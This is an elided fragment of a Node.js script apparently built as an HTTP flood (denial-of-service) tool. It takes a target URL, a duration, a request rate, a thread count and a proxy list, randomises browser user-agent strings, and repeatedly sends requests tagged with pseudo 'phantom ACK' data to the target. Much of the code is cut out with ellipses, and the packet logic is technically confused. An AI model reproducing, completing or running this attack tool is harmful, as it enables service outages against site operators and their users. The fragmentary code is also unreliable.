...
const secureOptions =
 ...
 if (process.argv.length < 7){console.log(`node GLORY.js url time rqs thread proxy.txt`); process.exit();}
...
function generatePhantomACKSequence() {
    const seq = crypto.randomBytes(4).readUInt32BE(0); // Random sequence number
    return seq;
}
const phantomACK = {
                    ackNumber: generatePhantomACKSequence(),
                    seqNumber: generatePhantomACKSequence(),
};
...
const uap = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 106 + 1)) + 104 }` + ".0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 106 + 1)) + 104 }` + ".0.0.0 Safari/537.36",
 ];
...
function shuffleObject(obj) {
              ...
              //      ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                ...
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    const phantomPacket = `ACK ${phantomACK.ackNumber} SEQ ${phantomACK.seqNumber} on ${parsedTarget.host}`;
                    request.push(phantomPacket);
                    request1.push(phantomPacket);
                    request.end();
                    request1.end();
                }
                }, 500);
